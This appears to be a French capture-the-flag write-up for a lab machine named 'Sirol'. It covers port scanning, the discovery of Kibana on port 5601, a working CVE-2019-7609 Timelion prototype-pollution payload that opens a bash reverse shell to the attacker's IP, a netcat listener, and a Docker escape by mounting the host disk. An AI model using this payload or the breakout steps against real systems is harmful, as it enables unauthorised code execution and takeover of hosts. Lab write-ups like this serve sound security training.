  # Sirol

	sudo masscan -p1-65535,U:1-65535 192.168.164.54 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.164.54 -oN nmap.txt
	feroxbuster --silent -u http://192.168.164.54
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)  
    53/tcp closed domain  
    80/tcp open http Apache httpd 2.4.25 ((Debian))  
    3306/tcp open mysql MariaDB (unauthorized)  
    5601/tcp open esmagent?
	
Il y a une calculatrice minimaliste sur le site du port 80. J'ai directement pensé à une SSTI, ou à une injection plus généralement, sans succès.

En revanche j'ai trouvé des informations sur le port 5601 : 

	nc 192.168.164.54 5601  
	help  
> 	HTTP/1.1 400 Bad Request

	nc 192.168.164.54 5601  
	GET / 
>	HTTP/1.1 302 Found   	
	location: /app/kibana   	
	kbn-name: kibana 
	kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67  
	cache-control: no-cache
	content-length: 0
	connection: close  
	Date: Wed, 05 Jul 2023 09:11:42 GMT

Et sur mon navigateur le port 5601 redirige vers http://192.168.164.54:5601/app/kibana#/home?_g=()

Exploit trouvé pour cette version : https://github.com/mpgn/CVE-2019-7609

Vulnérabilité de type Prototype Pollution. Payload à injecter dans Timelion : 

	.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.45.214/443 0>&1\'");//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

On arrive directement en tant que root mais dans un container Docker. Il y a un fichier ".dockerenv" à la racine.

	...
	rlwrap nc -nvlp 443
	
Exemple de fiche à suivre pour s'échapper d'un container : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

La technique du mount fonctionne : 

	fdisk -l 
	mkdir /mnt/privesc
	mount /dev/sda1 /mnt/privesc
	cd /mnt/privesc
	cat /root/proof.txt
